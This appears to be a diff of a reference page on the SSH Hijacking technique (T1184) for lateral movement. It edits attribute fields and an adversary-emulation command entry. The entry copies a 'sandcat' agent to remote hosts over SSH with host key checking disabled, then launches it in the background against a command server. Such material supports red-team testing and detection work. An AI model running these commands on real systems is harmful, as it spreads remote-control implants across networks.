@@ -11,21 +11,27 @@ In order to move laterally from a compromised host, adversaries may take advanta
 
 [SSH Hijacking](https://attack.mitre.org/techniques/T1184) differs from use of [Remote Services](https://attack.mitre.org/techniques/T1021) because it injects into an existing SSH session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).
 
+## Aliases
+
+```
+
+```
+
 ## Additional Attributes
 
 * Bypass: None
 * Effective Permissions: None
-* Network: intentionally left blank
+* Network: None
 * Permissions: ['User', 'root']
 * Platforms: ['Linux', 'macOS']
-* Remote: intentionally left blank
+* Remote: None
 * Type: attack-pattern
 * Wiki: https://attack.mitre.org/techniques/T1184
 
 ## Potential Commands
 
 ```
-{'darwin': {'sh': {'command': "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go &&\nssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'\n", 'cleanup': "ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'pkill -f sandcat & rm -f ~/sandcat.go'\n", 'payloads': ['sandcat.go-darwin']}}, 'linux': {'sh': {'command': "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go &&\nssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'\n", 'cleanup': "ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'pkill -f sandcat & rm -f ~/sandcat.go'\n", 'payloads': ['sandcat.go-linux']}}}
+{'darwin': {'sh': {'command': "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go &&\nssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'\n", 'cleanup': "ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'pkill -f sandcat & rm -f ~/sandcat.go'\n", 'payloads': ['sandcat.go-darwin']}}, 'linux': {'sh': {'command': "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go &&\nssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'\n", 'cleanup': "ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no #{remote.ssh.cmd} 'pkill -f sandcat & rm -f ~/sandcat.go'\n", 'payloads': ['sandcat.go-linux']}}}
 ```
 
 ## Commands Dataset
@@ -45,7 +51,8 @@ In order to move laterally from a compromised host, adversaries may take advanta
                                            '#{server} -group red 1>/dev/null '
                                            "2>/dev/null &'\n",
                                 'payloads': ['sandcat.go-darwin']}},
-              'linux': {'sh': {'cleanup': 'ssh -o ConnectTimeout=3 '
+              'linux': {'sh': {'cleanup': 'ssh -o ConnectTimeout=3 -o '
+                                          'StrictHostKeyChecking=no '
                                           "#{remote.ssh.cmd} 'pkill -f sandcat "
                                           "& rm -f ~/sandcat.go'\n",
                                'command': 'scp -o StrictHostKeyChecking=no -o '
@@ -140,6 +147,8 @@ In order to move laterally from a compromised host, adversaries may take advanta
                                                                                                                                              'linux': {'sh': {'cleanup': 'ssh '
                                                                                                                                                                          '-o '
                                                                                                                                                                          'ConnectTimeout=3 '
+                                                                                                                                                                         '-o '
+                                                                                                                                                                         'StrictHostKeyChecking=no '
                                                                                                                                                                          '#{remote.ssh.cmd} '
                                                                                                                                                                          "'pkill "
                                                                                                                                                                          '-f '
